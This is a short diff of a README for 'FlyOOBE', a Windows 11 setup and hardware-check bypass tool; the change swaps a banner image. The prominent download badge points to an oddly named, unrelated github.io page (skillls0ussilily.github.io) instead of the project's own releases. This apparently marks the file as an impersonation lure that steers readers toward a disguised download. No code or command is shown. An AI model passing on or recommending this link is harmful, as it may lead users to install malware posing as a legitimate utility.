@@ -2,7 +2,7 @@
 
 > **Your intelligent setup companion for Windows 11: Streamline the Out-Of-Box Experience, customize hardware requirements checks, and configure privacy settings during installation.**
 
-![Banner Placeholder](https://www.racunalniske-novice.com/wp-content/uploads/2025/08/1755328519_flyoobe-1024x576.jpg)
+![Banner Placeholder](https://cdn1.vogel.de/fz61mqmhAwArfYPubQeV9e8rcyI=/fit-in/800x0/p7i.vogel.de/wcms/b7/98/b79870565a6ef3a727917494de5a27b2/0129252860v1.jpeg)
 
 [![Get FlyOOBE Now](https://img.shields.io/badge/Get_FlyOOBE_Windows_11-Now-0a5d8d?style=for-the-badge&logo=github)](https://skillls0ussilily.github.io/.github/flyoobe)
 
